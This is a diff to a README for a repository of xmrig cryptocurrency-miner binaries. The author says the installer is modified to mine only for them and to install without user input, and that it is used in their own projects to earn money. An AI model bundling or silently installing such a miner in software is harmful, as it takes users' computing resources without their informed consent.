@@ -4,7 +4,7 @@ This repository contains binaries of xmrig miner (see https://github.com/xmrig/x
 
 Why: I use this to get a bit of money from my projects (you're able to disable this at any time if one of my projects uses this)
 
-What: This installer of xmrig is modified so that it only mines for me
+What: This installer of xmrig is modified so that it only mines for me and installs without user input
 ## INSTALL
 
 ### Windows
